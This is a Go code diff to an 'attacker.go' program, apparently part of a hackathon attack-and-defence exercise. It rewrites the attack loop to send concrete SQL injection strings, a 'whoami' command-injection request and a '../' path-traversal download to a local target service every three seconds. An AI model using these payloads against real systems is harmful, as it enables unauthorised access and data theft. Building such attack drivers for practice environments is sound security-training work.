@@ -4,7 +4,6 @@ import (
 	"bytes"
 	"encoding/json"
 	"fmt"
-	"math/rand"
 	"net/http"
 	"os"
 	"time"
@@ -41,24 +40,46 @@ func activeService(orch string) string {
 func main() {
 	orch := env("ORCH", env("ORCHESTRATOR_URL", "http://orchestrator:9000"))
 	target := env("MY_TARGET", "http://localhost:9100")
-	secret := env("HACKATHON_SECRET", "HACKATHON_SECRET_2025")
-	vulns := []string{"sql_injection", "xss", "csrf", "rce", "auth_bypass"}
 
 	fmt.Println("[attacker.go] started")
 	for {
 		svc := activeService(orch)
-		v := vulns[rand.Intn(len(vulns))]
-		body, _ := json.Marshal(map[string]string{
-			"vulnerability_type": v,
-			"service":            svc,
-			"secret":             secret,
-		})
-		resp, err := http.Post(target+"/"+svc+"/attack", "application/json", bytes.NewBuffer(body))
-		if err != nil {
-			fmt.Println("attack error:", err)
+		var reqURL string
+		var body any
+
+		switch svc {
+		case "web":
+			reqURL = target + "/web/login"
+			body = map[string]string{"username": "admin' OR '1'='1", "password": "x"}
+		case "api":
+			reqURL = target + "/api/run"
+			body = map[string]string{"cmd": "whoami"}
+		case "file":
+			reqURL = target + "/file/download?file=../files/sample.txt"
+		case "db":
+			reqURL = target + "/db/query"
+			body = map[string]string{"search": "' OR '1'='1"}
+		default:
+			reqURL = target + "/web/search?q=%27%20OR%20%271%27%3D%271"
+		}
+
+		if body != nil {
+			payload, _ := json.Marshal(body)
+			resp, err := http.Post(reqURL, "application/json", bytes.NewBuffer(payload))
+			if err != nil {
+				fmt.Println("attack error:", err)
+			} else {
+				fmt.Println("attack", svc, "->", resp.StatusCode)
+				resp.Body.Close()
+			}
 		} else {
-			fmt.Println("attack", svc, v, "->", resp.StatusCode)
-			resp.Body.Close()
+			resp, err := http.Get(reqURL)
+			if err != nil {
+				fmt.Println("attack error:", err)
+			} else {
+				fmt.Println("attack", svc, "->", resp.StatusCode)
+				resp.Body.Close()
+			}
 		}
 		time.Sleep(3 * time.Second)
 	}
